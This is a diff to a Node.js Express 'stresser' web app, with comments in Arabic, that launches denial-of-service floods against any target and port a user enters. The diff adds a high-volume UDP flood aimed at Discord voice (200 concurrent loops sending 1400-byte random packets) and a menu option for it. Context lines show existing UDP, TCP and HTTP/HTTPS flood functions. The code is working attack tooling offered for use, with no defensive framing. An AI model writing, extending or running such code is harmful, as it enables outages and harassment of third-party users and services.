@@ -8,15 +8,32 @@ const crypto = require('crypto');
 const app = express();
 app.use(express.json());
 
-// متغيرات الإحصائيات
 let stats = { packets: 0, status: 'idle', target: '' };
 
-// ---------- الهجمات ----------
+// ---------- هجوم ديسكورد الصوتي (UDP مكثف) ----------
+function discordVoiceFlood(target, port, duration) {
+    const endTime = Date.now() + duration * 1000;
+    const payload = crypto.randomBytes(1400); // أقصى حجم حزمة لتجنب التقطيع
+    
+    const loop = () => {
+        if (Date.now() > endTime) return;
+        for (let i = 0; i < 50; i++) {
+            const client = dgram.createSocket('udp4');
+            client.send(payload, 0, payload.length, port, target, () => {
+                stats.packets++;
+                client.close();
+            });
+        }
+        setImmediate(loop);
+    };
+    // 200 مسار متزامن لاستنزاف أقصى باندويث
+    for(let i=0; i<200; i++) loop();
+}
 
+// ---------- الهجمات الأخرى ----------
 function udpFlood(target, port, duration) {
     const endTime = Date.now() + duration * 1000;
     const buffer = crypto.randomBytes(1024);
-    
     const loop = () => {
         if (Date.now() > endTime) return;
         for (let i = 0; i < 20; i++) {
@@ -28,7 +45,7 @@ function udpFlood(target, port, duration) {
         }
         setImmediate(loop);
     };
-    for(let i=0; i<50; i++) loop(); // 50 مسار متوازي
+    for(let i=0; i<50; i++) loop();
 }
 
 function tcpFlood(target, port, duration) {
@@ -74,8 +91,7 @@ function httpFlood(target, port, duration, useHttps = false) {
     for(let i=0; i<20; i++) loop();
 }
 
-// ---------- الموقع ----------
-
+// ---------- API ----------
 app.post('/api/attack', (req, res) => {
     const { target, port, method, duration } = req.body;
     if (!target || !port || !method || !duration) return res.status(400).json({ error: 'Missing parameters' });
@@ -85,7 +101,8 @@ app.post('/api/attack', (req, res) => {
     const d = parseInt(duration);
 
     try {
-        if (method === 'udp') udpFlood(target, p, d);
+        if (method === 'discord') discordVoiceFlood(target, p, d);
+        else if (method === 'udp') udpFlood(target, p, d);
         else if (method === 'tcp') tcpFlood(target, p, d);
         else if (method === 'http') httpFlood(target, p, d, false);
         else if (method === 'https') httpFlood(target, p, d, true);
@@ -102,6 +119,7 @@ app.get('/api/stats', (req, res) => {
     res.json(stats);
 });
 
+// ---------- الواجهة ----------
 app.get('/', (req, res) => {
     res.send(`
 <!doctype html>
@@ -135,6 +153,7 @@ app.get('/', (req, res) => {
   
   <label>Method</label>
   <select id="method">
+    <option value="discord">DISCORD VOICE (UDP MAX)</option>
     <option value="udp">UDP FLOOD</option>
     <option value="tcp">TCP FLOOD</option>
     <option value="http">HTTP FLOOD</option>
@@ -175,7 +194,6 @@ async function launch() {
   }
 }
 
-// تحديث الإحصائيات كل ثانية
 setInterval(async () => {
   try {
     const res = await fetch('/api/stats');
